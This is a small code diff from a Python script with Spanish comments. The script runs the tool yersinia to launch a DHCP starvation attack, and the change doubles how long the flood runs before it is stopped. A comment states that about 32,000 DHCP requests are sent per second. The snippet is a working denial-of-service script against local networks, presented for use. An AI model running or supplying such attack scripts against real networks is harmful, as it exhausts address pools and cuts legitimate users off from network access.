@@ -13,7 +13,7 @@ comando = "yersinia dhcp -attack 1"
 proceso = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
 # En un segundo se envian al rededor de 32mil peticiones DHCP
-time.sleep(1)
+time.sleep(2)
 
 # Envía una tecla al shell para finalizar el proceso
 proceso.stdin.write("\n")
